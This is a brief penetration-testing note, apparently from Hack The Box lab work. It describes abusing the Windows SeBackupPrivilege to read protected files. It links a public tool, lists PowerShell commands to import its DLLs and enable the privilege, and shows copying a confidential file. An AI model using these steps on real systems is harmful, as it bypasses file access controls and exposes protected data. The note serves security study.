# SeBackup Privilige Copy Protected File

OS: Windows
Description: SeBackupPriv PoC
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### SeBackupPriv PoC

```jsx
https://github.com/giuliano108/SeBackupPrivilege
```

```jsx
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

- Enable SeBackupPrivilege

```jsx
Get-SeBackupPrivilege
Set-SeBackupPrivilege
```

### Copy Protected File from present location to current location

```jsx
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```